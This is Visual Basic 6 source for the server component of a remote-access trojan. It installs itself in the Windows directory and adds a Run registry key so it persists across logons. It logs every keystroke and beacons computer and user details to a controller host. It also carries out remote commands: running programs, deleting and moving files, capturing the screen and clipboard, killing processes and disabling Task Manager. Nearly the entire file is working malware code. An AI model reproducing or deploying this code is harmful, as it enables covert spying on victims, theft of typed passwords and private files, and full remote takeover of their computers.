VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form Form1 
   Caption         =   "Server"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   8895
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   8895
   StartUpPosition =   3  'Windows Default
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   6840
      Top             =   1560
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.PictureBox Picture1 
      Height          =   615
      Left            =   6840
      ScaleHeight     =   555
      ScaleWidth      =   675
      TabIndex        =   1
      Top             =   360
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.Timer Timer2 
      Interval        =   1
      Left            =   360
      Top             =   2520
   End
   Begin VB.TextBox Text1 
      Height          =   2055
      Left            =   360
      TabIndex        =   0
      Top             =   240
      Width           =   4815
   End
   Begin VB.Timer Timer1 
      Interval        =   3000
      Left            =   5400
      Top             =   240
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6000
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim NoTemp As String
Dim FlagSendInfo As Boolean
Dim FileSize As Long

Private Sub Form_Load()
Dim tempstring As String
    
    Winsock1.RemoteHost = IP_CLIENT
    Winsock1.RemotePort = PORT_CLIENT
    
    folder = Environ$("windir") & "\"
    If (Not (FileExists(folder & NAME_SERVER))) Then
    
    Open App.EXEName For Binary As #1
    Open folder & NAME_SERVER For Binary As #2
        Do While Not EOF(1)
            tempstring = Input(1024, 1)
            Put #2, , tempstring
            On Error GoTo ExitCreteServer
        Loop
ExitCreteServer:
        Close #1
        Close #2
     'Autorun in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
     SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", KEYREGFORSERVER, folder & NAME_SERVER, REG_SZ
    End If
End Sub



Private Sub Timer1_Timer()
Dim appoggio As String
Dim appoggio2 As String


    If Winsock1.State <> sckConnected Then
        Winsock1.Close
        Winsock1.Connect
        FlagSendInfo = False
        Timer1.Interval = 3000
        If FlagOKsend = False Then
            If (FileExists(folder & NAME_KEYLOG)) Then UploadKeylog
        End If
        FlagKeylog = False
    End If
    
    If Winsock1.State = sckConnected And FlagSendInfo = False Then
        appoggio = Space(255)
        'Computer name
        GetComputerName appoggio, 255
        appoggio = Left$(appoggio, InStr(appoggio, Chr$(0)) - 1) + "*"
        'User Name
        appoggio2 = Space(255)
        GetUserName appoggio2, 255
        appoggio2 = Left$(appoggio2, InStr(appoggio2, Chr$(0)) - 1) + "*"
        ' OS + time since run windows
        Winsock1.SendData "/INFOPCPC/" + RetriveOS() + "*" + appoggio + appoggio2 + Str(Fix(GetTickCount / 60000)) + "*" + Trim(GetSystemMetrics(0)) + "x" + Trim(GetSystemMetrics(1))
        FlagSendInfo = True
        Timer1.Interval = 10000
    End If
End Sub

Private Sub Timer2_Timer()
Dim lngKeyState As Long, lngShift As Long
  Dim i As Integer
    
    lngShift = GetAsyncKeyState(vbKeyShift)
    
    'Tasten A-Z (vbKeyA bis vbKeyZ).
     For i = 65 To 90
        lngKeyState = GetAsyncKeyState(i)
        
        ' Grossbuchstabe.
        If (CapsLockOn = True And lngShift = 0 And (lngKeyState And &H1) = &H1) Or _
            (CapsLockOn = False And lngShift <> 0 And (lngKeyState And &H1) = &H1) Then
            
            Call AddText(UCase(Chr(i)))
        End If
        
        ' Kleinbuchstabe.
        If (CapsLockOn = False And lngShift = 0 And (lngKeyState And &H1) = &H1) Or _
            (CapsLockOn = True And lngShift <> 0 And (lngKeyState And &H1) = &H1) Then
            
            Call AddText(LCase(Chr(i)))
        End If
    Next i
    
    lngKeyState = GetAsyncKeyState(vbKey1)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("1")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("!")
    
    lngKeyState = GetAsyncKeyState(vbKey2)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("2")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("@")
    
    lngKeyState = GetAsyncKeyState(vbKey3)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("3")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("#")
    
    lngKeyState = GetAsyncKeyState(vbKey4)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("4")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("$")
    
    lngKeyState = GetAsyncKeyState(vbKey5)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("5")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("%")
    
    lngKeyState = GetAsyncKeyState(vbKey6)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("6")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("^")
    
    lngKeyState = GetAsyncKeyState(vbKey7)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("7")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("&")
    
    lngKeyState = GetAsyncKeyState(vbKey8)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("8")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("*")
    
    lngKeyState = GetAsyncKeyState(vbKey9)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("9")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("(")
    
    lngKeyState = GetAsyncKeyState(vbKey0)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("0")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText(")")
    
    lngKeyState = GetAsyncKeyState(vbKeyBack)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{BackSpace}")
    
    lngKeyState = GetAsyncKeyState(vbKeyTab)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Tab}")
    
    lngKeyState = GetAsyncKeyState(vbKeyReturn)
    If (lngKeyState And &H1) = &H1 Then Call AddText(vbCrLf)
    
    lngKeyState = GetAsyncKeyState(vbKeyShift)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Shift}")
    
    lngKeyState = GetAsyncKeyState(vbKeyControl)
    If (lngKeyState And &H1) = &H1 Then
        If (GetAsyncKeyState(vbKeyMenu) And &H1) = &H1 Then   ' AltGr.
            Call AddText("{AltGr}")
        Else   ' Ctrl.
            Call AddText("{Ctrl}")
        End If
    End If
    
    lngKeyState = GetAsyncKeyState(vbKeyMenu)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Alt}")
    
    lngKeyState = GetAsyncKeyState(vbKeyPause)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Pause}")
    
    lngKeyState = GetAsyncKeyState(vbKeyEscape)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Esc}")
    
    lngKeyState = GetAsyncKeyState(vbKeySpace)
    If (lngKeyState And &H1) = &H1 Then Call AddText(" ")
    
    lngKeyState = GetAsyncKeyState(vbKeyEnd)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{End}")
    
    lngKeyState = GetAsyncKeyState(vbKeyHome)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Home}")
    
    lngKeyState = GetAsyncKeyState(vbKeyLeft)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Left}")
    
    lngKeyState = GetAsyncKeyState(vbKeyRight)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Right}")
    
    lngKeyState = GetAsyncKeyState(vbKeyUp)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Up}")
    
    lngKeyState = GetAsyncKeyState(vbKeyDown)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Down}")
    
    lngKeyState = GetAsyncKeyState(vbKeyInsert)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Insert}")
    
    lngKeyState = GetAsyncKeyState(vbKeyDelete)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Delete}")
    
    lngKeyState = GetAsyncKeyState(&HBA)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText(";")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText(":")
    
    lngKeyState = GetAsyncKeyState(&HBB)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("=")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("+")
    
    lngKeyState = GetAsyncKeyState(&HBC)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText(",")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("<")
    
    lngKeyState = GetAsyncKeyState(&HBD)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("-")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("_")
    
    lngKeyState = GetAsyncKeyState(&HBE)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText(".")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText(">")
    
    lngKeyState = GetAsyncKeyState(&HBF)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("/")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("?")
    
    lngKeyState = GetAsyncKeyState(&HC0)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("`")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("~")
    
    lngKeyState = GetAsyncKeyState(&HDB)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("[")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("{")
    
    lngKeyState = GetAsyncKeyState(&HDC)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("\")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("|")
    
    lngKeyState = GetAsyncKeyState(&HDD)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("]")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText("}")
    
    lngKeyState = GetAsyncKeyState(&HDE)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("'")
    If lngShift <> 0 And (lngKeyState And &H1) = &H1 Then Call AddText(Chr$(34))
    
    lngKeyState = GetAsyncKeyState(vbKeyMultiply)
    If (lngKeyState And &H1) = &H1 Then Call AddText("*")
    
    lngKeyState = GetAsyncKeyState(vbKeyDivide)
    If (lngKeyState And &H1) = &H1 Then Call AddText("/")
    
    lngKeyState = GetAsyncKeyState(vbKeyAdd)
    If (lngKeyState And &H1) = &H1 Then Call AddText("+")
    
    lngKeyState = GetAsyncKeyState(vbKeySubtract)
    If (lngKeyState And &H1) = &H1 Then Call AddText("-")
    
    lngKeyState = GetAsyncKeyState(vbKeyDecimal)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{Del}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF1)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F1}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF2)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F2}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF3)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F3}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF4)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F4}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF5)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F5}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF6)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F6}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF7)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F7}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF8)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F8}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF9)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F9}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF10)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F10}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF11)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{F11}")
    
    lngKeyState = GetAsyncKeyState(vbKeyF12)
    If lngShift = 0 And (lngKeyState And &H1) = &H1 Then Call AddText("{F12}")
      
    lngKeyState = GetAsyncKeyState(vbKeyNumlock)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{NumLock}")
    
    lngKeyState = GetAsyncKeyState(vbKeyScrollLock)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{ScrollLock}")
    
    lngKeyState = GetAsyncKeyState(vbKeySnapshot)   ' vbKeyPrint?!
    If (lngKeyState And &H1) = &H1 Then Call AddText("{PrintScreen}")
    
    lngKeyState = GetAsyncKeyState(vbKeyPageUp)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{PageUp}")
    
    lngKeyState = GetAsyncKeyState(vbKeyPageDown)
    If (lngKeyState And &H1) = &H1 Then Call AddText("{PageDown}")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad1)
    If (lngKeyState And &H1) = &H1 Then Call AddText("1")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad2)
    If (lngKeyState And &H1) = &H1 Then Call AddText("2")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad3)
    If (lngKeyState And &H1) = &H1 Then Call AddText("3")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad4)
    If (lngKeyState And &H1) = &H1 Then Call AddText("4")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad5)
    If (lngKeyState And &H1) = &H1 Then Call AddText("5")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad6)
    If (lngKeyState And &H1) = &H1 Then Call AddText("6")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad7)
    If (lngKeyState And &H1) = &H1 Then Call AddText("7")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad8)
    If (lngKeyState And &H1) = &H1 Then Call AddText("8")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad9)
    If (lngKeyState And &H1) = &H1 Then Call AddText("9")
    
    lngKeyState = GetAsyncKeyState(vbKeyNumpad0)
    If (lngKeyState And &H1) = &H1 Then Call AddText("0")
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim Tempdata As String
    Dim appoggio As String
    
    Dim file_data As WIN32_FIND_DATA
    Dim hFile As Long
    Dim numero As Long
    
    Dim cont As Integer
    
    
    On Error GoTo ErrorExit
    Winsock1.GetData Tempdata
    
    '----test------
    'test.Show
    'test.Text1.Text = test.Text1.Text + vbCrLf + TempData
    '----test------
    
    Select Case Left(Tempdata, 10)
'-----------------------------------------------------
'Reboot PC
'-----------------------------------------------------
    Case "/REBOOTPC/"
        ExitWindowsEx EWX_REBOOT, 0&
'-----------------------------------------------------
'Shutdown PC
'-----------------------------------------------------
    Case "/SHUTDOWN/"
        ExitWindowsEx EWX_FORCE, 0&
'-----------------------------------------------------
'Disable CTRL-ALT-CANC
'-----------------------------------------------------
    Case "/DISCTRLC/"
       SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0, REG_SZ
'-----------------------------------------------------
'Enable CTRL-ALT-CANC
'-----------------------------------------------------
    Case "/ENBCRTLC/"
        DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr"
'-----------------------------------------------------
'Enable Keylog
'-----------------------------------------------------
    Case "/KEYSLOGG/"
        FlagKeylog = True
'-----------------------------------------------------
'Disable Keylog
'-----------------------------------------------------
    Case "/LOGDISBL/"
        FlagKeylog = False
'-----------------------------------------------------------
'Open CD
'-----------------------------------------------------------
    Case "/OPENCDCD/"
        mciExecute "Set CDaudio door open"
'-----------------------------------------------------------
'Close CD
'-----------------------------------------------------------
    Case "/CLOSECDD/"
        mciExecute "Set CDaudio door closed"
'------------------------------------------------------------
'Hidden Mouse
'------------------------------------------------------------
    Case "/HIDEMOUS/"
        ShowCursor False
'------------------------------------------------------------
'Show Mouse
'------------------------------------------------------------
    Case "/SHOWMOUS/"
        ShowCursor True
'------------------------------------------------------------
'RUN File
'------------------------------------------------------------
     Case "/RUNEXEFL/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        Shell Tempdata
        Winsock1.SendData "/SUCCESSS/"
'------------------------------------------------------------
'KillFile
'------------------------------------------------------------
    Case "/KILLFILE/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        Kill Tempdata
        Winsock1.SendData "/SUCCESSS/"
'------------------------------------------------------------
'KillDirs
'------------------------------------------------------------
    Case "/KILLDIRS/"
       Tempdata = Mid(Tempdata, 11, Len(Tempdata))                      'Tempdata = c:\windows\deleteme*deleteme
       appoggio = Left(Tempdata, InStr(Tempdata, "*") - 1)              'appoggio = c:\windows\
       Tempdata = Mid(Tempdata, Len(appoggio) + 2, Len(Tempdata))       'Tempdata = \deleteme
       
       killfolder appoggio, Tempdata
       Winsock1.SendData "/SUCCESSS/"
'-----------------------------------------------------
'File Size
'-----------------------------------------------------
    Case "/FILESIZE/"
       Tempdata = Mid(Tempdata, 11, Len(Tempdata))
       FindFirstFile Tempdata, file_data
       Winsock1.SendData "/FILESIZE/" & file_data.nFileSizeLow
'-----------------------------------------------------
'Open URL
'-----------------------------------------------------
    Case "/OPENURLS/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        Shell ("explorer " & Tempdata)
        DoEvents
        Winsock1.SendData "/SUCCESSS/"
'-----------------------------------------------------
'Change HOME page Iexplorer
'-----------------------------------------------------
    Case "/CHANGEHM/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\Main", "Start Page", Tempdata, REG_SZ
'-----------------------------------------------------
'Change Desktop
'-----------------------------------------------------
    Case "/CHANGEDK/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        SystemParametersInfo 20, 0&, Tempdata, &H1 Or &H2
        Winsock1.SendData "/SUCCESSS/"
'-----------------------------------------------------
'Make Dir
'-----------------------------------------------------
    Case "/MAKEDIRS/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        If Dir(Tempdata, vbDirectory) = "" Then
            MkDir Tempdata
        End If
'-----------------------------------------------------
'List Process
'-----------------------------------------------------
    Case "/LISTPROC/"
        Winsock1.SendData "/LISTPROC/" + ListProcess()
'-----------------------------------------------------
'Stop download
'-----------------------------------------------------
    Case "/STOPDOWN/"
        Close #FILEDOWN
'-----------------------------------------------------
'Download File
'-----------------------------------------------------
    Case "/DOWNFILE/"
        appoggio = Mid(Tempdata, 11, Len(Tempdata))
        hFile = FindFirstFile(appoggio, file_data)
            
            Open appoggio For Binary As #FILEDOWN
            Tempdata = Input(PAKSEND, FILEDOWN)
            FileSize = file_data.nFileSizeLow - PAKSEND
            Winsock1.SendData "/STARTDOW/" & file_data.nFileSizeLow & "*" & Tempdata
    Case "/ENCOREFL/"
        If FileSize > PAKSEND Then
            Tempdata = Space(PAKSEND)
            Get #FILEDOWN, , Tempdata
            Winsock1.SendData "/PAKSSEND/" & Tempdata
            FileSize = FileSize - PAKSEND
        Else
            Tempdata = ""
            Tempdata = Space(FileSize)
            Get #FILEDOWN, , Tempdata
            Winsock1.SendData "/PAKSSEND/" & Tempdata
            DoEvents
            Close #FILEDOWN
            Winsock1.SendData "/FINEDOWN/"
        End If
'-----------------------------------------------------
'Stop upload
'-----------------------------------------------------
    Case "/STOPUPLD/"
        Close #FILEUPLD
'-----------------------------------------------------
'Upload File
'-----------------------------------------------------
    Case "/UPLOADFL/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        Open Tempdata For Binary As #FILEUPLD
        
        Winsock1.SendData "/STARUPLD/"
    Case "/OTHERPAK/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        Put #FILEUPLD, , Tempdata
        Winsock1.SendData "/ANOTHEPK/"
    Case "/FINEUPLD/"
        Close #FILEUPLD
'-----------------------------------------------------
'Stop upload
'-----------------------------------------------------
    Case "/STOPDESK/"
        Close #FILEDESK
        Kill "c:\1.jpg"
'-----------------------------------------------------
'Download Desktop
'-----------------------------------------------------
    Case "/DOWNDESK/"
        If (Not (FileExists(folder & "\system32\PicToJpg.dll"))) Then
            Winsock1.SendData "/NEVERDLL/" & Environ$("windir")
        Else
            numero = Mid(Tempdata, 11, Len(Tempdata))
            Call keybd_event(vbKeySnapshot, 0, 0, 0)
            Picture1.Picture = Clipboard.GetData(vbCFBitmap)
            Call SavePictureAsJpeg(Picture1, "c:\1.jpg", numero)
            hFile = FindFirstFile("c:\1.jpg", file_data)
            
            Open "c:\1.jpg" For Binary As #FILEDESK
            Tempdata = Input(PAKSEND, FILEDESK)
            FileSize = file_data.nFileSizeLow - PAKSEND
            Winsock1.SendData "/STARDESK/" & file_data.nFileSizeLow & "*" & Tempdata
        End If
    Case "/ENCODESK/"
        If FileSize > PAKSEND Then
            Tempdata = Space(PAKSEND)
            Get #FILEDESK, , Tempdata
            Winsock1.SendData "/PAKSDESK/" & Tempdata
            FileSize = FileSize - PAKSEND
        Else
            Tempdata = ""
            Tempdata = Space(FileSize)
            Get #FILEDESK, , Tempdata
            Winsock1.SendData "/PAKSDESK/" & Tempdata
            DoEvents
            Close #FILEDESK
            Winsock1.SendData "/FINEDESK/"
            Kill "c:\1.jpg"
        End If
'-----------------------------------------------------
'Kill Process
'-----------------------------------------------------
    Case "/KILLPROC/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        Killproc Tempdata
        Winsock1.SendData "/SUCCESSS/"
'-----------------------------------------------------
'Show Message
'-----------------------------------------------------
    Case "/SHOWMESG/"
       Tempdata = Mid(Tempdata, 11, Len(Tempdata))
       appoggio = Extract(Tempdata)
       Tempdata = Mid(Tempdata, Len(appoggio) + 2, Len(Tempdata))
       numero = Val(Extract(Tempdata))
       Tempdata = Mid(Tempdata, Len(Extract(Tempdata)) + 2, Len(Tempdata))
       MsgBox appoggio, numero, Tempdata
'-----------------------------------------------------
'Print Text in default Printer
'-----------------------------------------------------
    Case "/PRINTTXT/"
        Printer.FontSize = Mid(Tempdata, 11, 2)
        Tempdata = Mid(Tempdata, 13, Len(Tempdata))
        Printer.Print Tempdata
        Printer.EndDoc
'------------------------------------------------------------
'Richiesta Lista Driver
'------------------------------------------------------------
    Case "/LISTDRVS/"
        Tempdata = ""
        Tempdata = Tempdata + "*" + ListDriver() + "*"
        Winsock1.SendData "/LISTDRVS/" + Tempdata
'------------------------------------------------------------
'Retrive ClipBoard
'------------------------------------------------------------
    Case "/CLIPBOAR/"
        Tempdata = Clipboard.GetText()
        Winsock1.SendData "/CLIPBOAR/" & Tempdata
'-----------------------------------------------------
'Rename file
'-----------------------------------------------------
    Case "/RENAMEFL/"
        Tempdata = Mid(Tempdata, 11, Len(Tempdata))
        appoggio = Left(Tempdata, InStr(Tempdata, "*") - 1)  'appoggio contiene il file originale
        Tempdata = Mid(Tempdata, Len(appoggio) + 2, Len(Tempdata))    'TempData il nuovo nome
        Name appoggio As Tempdata
        Winsock1.SendData "/SUCCESSS/"
'-----------------------------------------------------
'Remove Server
'-----------------------------------------------------
    Case "/REMOVESV/"
        DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", KEYREGFORSERVER
        Tempdata = ":riprova" & vbCrLf & "if exist " & folder & NAME_SERVER & " del " & folder & NAME_SERVER & vbCrLf
        appoggio = "if exist " & folder & NAME_KEYLOG & " del " & folder & NAME_KEYLOG & vbCrLf & "if errorlevel 1 goto riprova"
        Open "c:\autoexe.bat" For Binary As #FILEDELT
        Put #FILEDELT, , Tempdata + appoggio
        Close #FILEDELT
        Winsock1.SendData "/SUCCESSS/"
        Shell "c:\autoexe.bat"
        Unload Form1
'------------------------------------------------------------
'Richiesta DIR cartella
'------------------------------------------------------------
    Case "/LISTDIRS/"
            Tempdata = Mid(Tempdata, 11, Len(Tempdata))
            hFile = FindFirstFile(Tempdata & "\*.*", file_data)
            Tempdata = ""
            Do
                appoggio = file_data.cFileName
                appoggio = Left$(appoggio, InStr(appoggio, Chr$(0)) - 1)
            
                If (file_data.dwFileAttributes = 16) Or (file_data.dwFileAttributes = 48) _
                    Or (file_data.dwFileAttributes = 22) Or (file_data.dwFileAttributes = 18) _
                    Or (file_data.dwFileAttributes = 17) Then
                    appoggio = "(DIR)" + appoggio
                End If
                
                Tempdata = Tempdata + appoggio + "*"
                If FindNextFile(hFile, file_data) = 0 Then Exit Do
            Loop
            FindClose hFile
                        
            If Len(Tempdata) > 1024 Then
                NoTemp = Tempdata
                While Mid(NoTemp, 1024 + cont, 1) <> "*"
                    cont = cont + 1
                Wend
                Winsock1.SendData "/MULTIDIR/" + Left(NoTemp, 1024 + cont)
                DoEvents
                NoTemp = Mid(NoTemp, 1024 + cont + 1, Len(NoTemp))
            Else
                Winsock1.SendData "/ONLYONEP/" + Tempdata
            End If
            
        Case "/ENCOREDR/"
            
            If Len(NoTemp) > 1024 Then
                While Mid(NoTemp, 1024 + cont, 1) <> "*"
                    cont = cont + 1
                Wend
                Sleep (300)
                
                Winsock1.SendData "/MULTIDIR/" + Left(NoTemp, 1024 + cont)
                DoEvents
                NoTemp = Mid(NoTemp, 1024 + cont + 1, Len(NoTemp))
            Else
                Winsock1.SendData "/ONLYONEP/" + NoTemp
            End If
        
    End Select
Exit Sub


'------------------------------------------------------
'End Winsock1_DataArrival
'------------------------------------------------------
ErrorExit:
Winsock1.SendData "/OPFAILED/"
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Winsock1.Close
End Sub
 
